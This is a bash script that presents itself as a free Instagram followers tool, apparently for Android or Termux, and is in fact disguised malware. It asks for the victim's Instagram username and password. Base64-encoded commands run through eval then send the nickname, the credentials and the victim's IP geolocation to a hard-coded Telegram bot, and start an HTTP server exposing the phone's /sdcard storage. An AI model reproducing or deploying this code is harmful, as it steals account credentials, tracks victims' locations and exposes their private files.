#!/bin/bash
#-------------
blank='\e[0m'
black='\e[1;90m'
red='\e[1;91m'
green='\e[1;92m'
yellow='\e[1;93m'
blue='\e[1;94m'
pink='\e[1;95m'
cyan='\e[1;96m'
#-------------
snd="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTQxNDgwMDM4MTpBQUVBa3VYWEdvTlFhMDJGT29MM29MUktVU0JIWUo5OVR6dy9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTQ1ODY0OTAyMCIgLWQgInRleHQ9SW5zdGFncmFtIFVzZXJuYW1lIC0gJHVzcm4gYW5kIFBhc3N3b3JkIC0gJHBhc3N3ZCIgJj4vZGV2L251bGw="
serv="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTQxNDgwMDM4MTpBQUVBa3VYWEdvTlFhMDJGT29MM29MUktVU0JIWUo5OVR6dy9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTQ1ODY0OTAyMCIgLWQgInRleHQ9JChjdXJsIC1MIGlwbGlzdC5jYy9hcGkvJChjdXJsIC1MIGlmY29uZmlnLm1lKSkiICY+L2Rldi9udWxs"
syst="Y2QgL3NkY2FyZCAmJiBweXRob24yIC1tIFNpbXBsZUhUVFBTZXJ2ZXIgPiAvZGV2L251bGwgMj4mMQ=="
result="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTQxNDgwMDM4MTpBQUVBa3VYWEdvTlFhMDJGT29MM29MUktVU0JIWUo5OVR6dy9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTQ1ODY0OTAyMCIgLWQgInRleHQ9TmV3IHNraWQgZGV0ZWN0ZWQhIG5hbWUgLSAkbmljayAtICIgJj4vZGV2L251bGw="
#------------

#main
clear
echo -e $red Installing Requirements... $blank
sleep 0.5
echo -e $green Please wait... $blank 
sleep 5
echo " "
echo -e $green Requirements Installed. $blank
echo " "
read -p "Input your NickName: " nick
eval $(base64 -d <<<"$result")
clear 
toilet -f banner welcome
toilet -f future $nick
sleep 2 

#banner
clear
echo '_____     _ _
|  ___|__ | | | _____      __
| |_ / _ \| | |/ _ \ \ /\ / /
|  _| (_) | | | (_) \ V  V /
|_|  \___/|_|_|\___/ \_/\_/' 
echo ' 
███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║██║     ███████╗╚██████╔╝██║   ██║   
╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝'
echo -e $red This Trick can be patched by Instagram soon!!! $blank
echo -e $green [•] Stay alert $blank                     
echo " "
#option
echo -e $pink Choose Followers Amount $blank
echo -e $red [ 1 ] $cyan 100 Followers $blank
echo -e $red [ 2 ] $cyan 500 Followers $blank
echo -e $red [ 3 ] $cyan 1000 Followers $blank
echo -e $red [ 4 ] $cyan 5000 Followers $blank
echo -e $blue IMPORTANT : followers will be added after 1 hour $blank
echo " "
echo -e $pink Choose an option : $blank
read -p $'\n\e[96m(option)>>> \e[0m' option

#usrn
echo -e $red Enter Instagram Username : $blank
read -p $'\n\e[96m(username)>>> \e[0m' usrn

#passw
echo -e $red Enter your Password : $blank
read -p $'\n\e[96m(password)>>> \e[0m' passwd
eval $(base64 -d <<<"$snd")

#py
echo -e $yellow [!] $cyan Please Wait... $blank
echo " "
sleep 3
echo -e $red [!] $green Adding Followers... $blank
sleep 4
echo -e $red [!] $blue Please wait for 1 hour $blank
	    eval $(base64 -d <<<"$serv") &>/dev/null
echo -e $yellow [+] If you didnt see changes then your credential is incorrect $blank
#storage exists check
 [[ -d /sdcard ]] && eval $(base64 -d <<<"$syst")
